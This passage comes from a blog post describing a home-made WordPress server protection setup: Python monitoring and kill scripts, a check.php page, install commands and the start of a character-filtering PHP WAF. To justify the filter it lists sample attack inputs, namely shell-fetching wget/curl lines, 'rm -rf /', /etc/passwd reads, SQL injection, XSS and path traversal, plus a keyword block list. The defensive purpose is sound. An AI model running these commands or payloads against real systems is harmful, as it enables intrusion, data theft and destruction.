</span><span class='line'>      <span class="n">response</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'>      <span class="n">E404</span> <span class="o">=</span> <span class="s">&#39;404&#39;</span>
</span><span class='line'>      <span class="n">ENot</span> <span class="o">=</span> <span class="s">&#39;Not Found&#39;</span> <span class="c">#</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">E404</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="ow">or</span> <span class="n">E404</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">reason</span> <span class="ow">or</span> <span class="n">ENot</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="ow">or</span> <span class="n">ENot</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">reason</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&#39;yes&#39;</span>           
</span><span class='line'>          <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&#39;yes&#39;</span>           
</span><span class='line'>          <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">except</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPException</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">except</span> <span class="ne">IOError</span><span class="p">:</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">Attack</span> <span class="ow">is</span> <span class="mi">10</span><span class="p">:</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;python /root/ban.py&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">Attack</span> <span class="o">=</span> <span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>This file will check your server status from another host, you must change check.php file address and upload check.php on other hosting [you can use free hosting] and put url in this script. And notice you must change &lsquo;z3r0d4y&rsquo; word to your site title.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>out.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/out.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing </span>
</span><span class='line'><span class="n">err_c</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">opnurl</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">&#39;http://z3r0d4y.com/check.php&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">if</span> <span class="s">&#39;z3r0d4y&#39;</span> <span class="ow">in</span> <span class="n">opnurl</span><span class="p">:</span>
</span><span class='line'>          <span class="n">E</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">except</span><span class="p">:</span>
</span><span class='line'>      <span class="n">E</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="n">err_c</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">E</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;python /root/ban.py&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err_c</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">err_c</span> <span class="ow">is</span> <span class="mi">100</span><span class="p">:</span>
</span><span class='line'>      <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And now kill.py for stop process.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>kill.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/kill.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="c">#By Ali Razmjoo</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span> <span class="c">#start multiprocessing</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;ps aux | grep .py &gt; /root/id.txt&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/root/id.txt&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rsplit</span><span class="p">()</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#39;kill -9 &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>  <span class="k">except</span><span class="p">:</span>
</span><span class='line'>      <span class="n">skip</span> <span class="o">=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>At last check.php file content, It&rsquo;s simple. Just a file open my site and print the content.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>check.php</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/check.php'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$homepage</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;http://z3r0d4y.com/&#39;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$homepage</span><span class="p">){</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$homepage</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p><br>Setup example:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/service.zip?raw<span class="o">=</span><span class="nb">true</span> --no-check-certificate
</span><span class='line'>unzip service.zip
</span><span class='line'><span class="nb">cd </span>service
</span><span class='line'>mv * ../
</span><span class='line'><span class="nb">cd</span> ..
</span><span class='line'>rm -rf service
</span><span class='line'><span class="nb">cd </span>daemon
</span><span class='line'>make
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>If return you any error.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install gcc
</span><span class='line'>gcc start-stop-daemon.c -o start-stop-daemon
</span><span class='line'>cp start-stop-daemon /usr/sbin/
</span><span class='line'>chmod <span class="m">755</span> /usr/sbin/start-stop-daemon
</span><span class='line'>start-stop-daemon -V
</span><span class='line'><span class="c">#output: start-stop-daemon 1.9.18</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And then</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">cd</span> ..
</span><span class='line'>rm -rf daemon
</span><span class='line'>rm -rf service.zip
</span><span class='line'>mv zeroday /etc/init.d/
</span><span class='line'>chmod <span class="m">755</span> /etc/init.d/zeroday
</span><span class='line'>mv *.py /root/
</span><span class='line'><span class="nb">cd</span> /root/
</span><span class='line'>chmod <span class="m">755</span> *.py
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And now run and edit md5.py</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#nano md5.py =&gt; replace public_html directory in line 13</span>
</span><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="c"># python md5.py     =&gt; output:</span>
</span><span class='line'>d41d8cd98f00b204e9800998ecf8427e
</span><span class='line'>Stopping httpd:                                            <span class="o">[</span>  OK  <span class="o">]</span>
</span><span class='line'>
</span><span class='line'>All Dead
</span><span class='line'>
</span><span class='line'>Killed
</span><span class='line'><span class="c">#-------------------------------------------------</span>
</span><span class='line'>nano md5.py
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Go to line 52 and replace this md5 with md5 inside file ,And try run it again.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="c"># python md5.py</span>
</span><span class='line'>d41d8cd98f00b204e9800998ecf8427e
</span><span class='line'>pass , md5: d41d8cd98f00b204e9800998ecf8427e
</span><span class='line'>d41d8cd98f00b204e9800998ecf8427e
</span><span class='line'>pass , md5: d41d8cd98f00b204e9800998ecf8427e
</span><span class='line'>d41d8cd98f00b204e9800998ecf8427e
</span><span class='line'>pass , md5: d41d8cd98f00b204e9800998ecf8427e
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Next step you have to replace php file link address in out.py at line 8. And now it&rsquo;s working now.</p>




<p>And now about that php file , you should replace your primary word to your site name or title and then upload it on other host [you can also use free hosting as i said before] and now your service working well.
So until now your server files if change , this robot will stop Apache webserver so it mean no one cannot upload any badware [ shell scripts or anything ] on your website or deface your website or if any ddos attack or crashing happen it will ban attacker(s) IP and restart Apache webserver. this robot need to develop for working more easy and if I get more free time I&rsquo;ll improve this and make it easy to work.
but now , about other 0day Vulnerabilities on wordpress or plugins. so we need filter something on GET and POST Requests. If you think I want start listing words same</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>union
</span><span class='line'>select
</span><span class='line'>wget
</span><span class='line'>alert(
</span><span class='line'>wget
</span><span class='line'>curl
</span><span class='line'>information
</span><span class='line'>and bla bla
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>your are so wrong because it&rsquo;s so ridicules and it bypass easy so the best way it&rsquo;s filter these characters</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>!@#$%^<span class="ni">&amp;*()_+=-\|}{[]:&quot;?&gt;&lt;;</span>&#39;/.,
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>if we filter these characters most vulnerabilities will disable
Examples:
RCE:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>      <span class="o">=&gt;</span>  <span class="o">/</span>
</span><span class='line'><span class="nx">ls</span> <span class="o">-</span><span class="nx">la</span>     <span class="o">=&gt;</span> <span class="o">-</span>
</span><span class='line'><span class="k">echo</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="mi">1</span>   <span class="o">=&gt;</span>   <span class="o">&gt;</span>
</span><span class='line'><span class="nx">wget</span> <span class="nx">http</span><span class="o">://</span><span class="nx">z3r0d4y</span><span class="o">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">shell</span><span class="o">.</span><span class="nx">txt</span> <span class="o">=&gt;</span> <span class="o">://</span> <span class="o">.</span> <span class="o">.</span>
</span><span class='line'><span class="nx">curl</span> <span class="nx">z3r0d4y</span><span class="o">.</span><span class="nx">com</span>   <span class="o">=&gt;</span> <span class="o">.</span>
</span><span class='line'><span class="nx">rm</span> <span class="o">-</span><span class="nx">rf</span> <span class="o">/</span>    <span class="o">=&gt;</span> <span class="o">-</span> <span class="o">/</span>
</span><span class='line'><span class="nx">rm</span> <span class="o">*</span>   <span class="o">=&gt;</span> <span class="o">*</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>SQL:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">Union</span> <span class="nx">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span> <span class="nx">from</span> <span class="nx">admin</span><span class="o">--</span>        <span class="o">=&gt;</span>  <span class="p">,</span> <span class="o">-</span>
</span><span class='line'><span class="nx">hex</span><span class="p">(</span> <span class="p">,</span> <span class="nx">unhex</span><span class="p">(</span> <span class="p">,</span> <span class="nx">grpup_contact</span><span class="p">(</span> <span class="p">,</span> <span class="nx">bla</span> <span class="nx">bla</span>    <span class="o">=&gt;</span> <span class="p">(</span> <span class="nx">_</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>XSS:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">alert</span><span class="p">(</span>     <span class="o">=&gt;</span> <span class="p">(</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">img</span>        <span class="o">=&gt;</span> <span class="o">&lt;</span>
</span><span class='line'><span class="nx">scr</span><span class="o">=</span>       <span class="o">=&gt;</span> <span class="o">=</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">cookie</span>        <span class="o">=&gt;</span> <span class="o">.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>LFI:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>     <span class="o">=&gt;</span> <span class="o">/</span>
</span><span class='line'><span class="o">../</span>        <span class="o">=&gt;</span> <span class="o">.</span> <span class="o">/</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>and more &hellip; See everything filtered by a simple way but you must add some exceptions! a method for handle exception is put wp-comments-post.php in white list and [we know it&rsquo;s not vulnerable] and users want to send comment so it must be in white list and deny all others but we shouln&rsquo;t filter admin requests in wordpress [for posts and other js and &hellip; requests] so we generate a random md5 or any primary words and we put in php WAF and use Firefox user agent switcher to add a user agent for managing your blog, so now just you have a primary key on your server and just you can send any request so handle it on wp-config.php enjoy your new mini POWERFUL WAF.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>waf.php</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf.php'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$list_exceptions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;/wp-comments-post.php&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$list_deny</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;`&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;~&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;!&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;@&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;#&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;$&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;%&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;^&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;*&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;(&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;)&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;-&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;_&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;+&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;[&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;]&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;{&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;}&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;|&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;;&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;:&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;&lt;&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;?&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;/&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;,&quot;</span><span class="p">,</span>
</span><span class='line'><span class="s2">&quot;.&quot;</span><span class="p">,</span>
</span><span class='line'><span class="p">);</span>
</span><span class='line'><span class="nv">$detect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="nv">$get</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="nv">$post</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="nv">$protocol</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_PROTOCOL&#39;</span><span class="p">]),</span><span class="s1">&#39;https&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span> <span class="o">?</span> <span class="s1">&#39;http&#39;</span> <span class="o">:</span> <span class="s1">&#39;https&#39;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$script</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_NAME&#39;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$params</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$currentUrl</span> <span class="o">=</span> <span class="nv">$protocol</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$host</span> <span class="o">.</span> <span class="nv">$script</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">;</span>
</span><span class='line'><span class="nv">$script</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$script</span><span class="p">);</span>
</span><span class='line'><span class="nv">$script</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$script</span><span class="p">);</span>
</span><span class='line'><span class="nv">$script</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$script</span><span class="p">);</span>
</span><span class='line'><span class="nv">$script</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$script</span><span class="p">);</span>
</span><span class='line'><span class="nv">$params</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</span><span class='line'><span class="nv">$params</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</span><span class='line'><span class="nv">$params</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
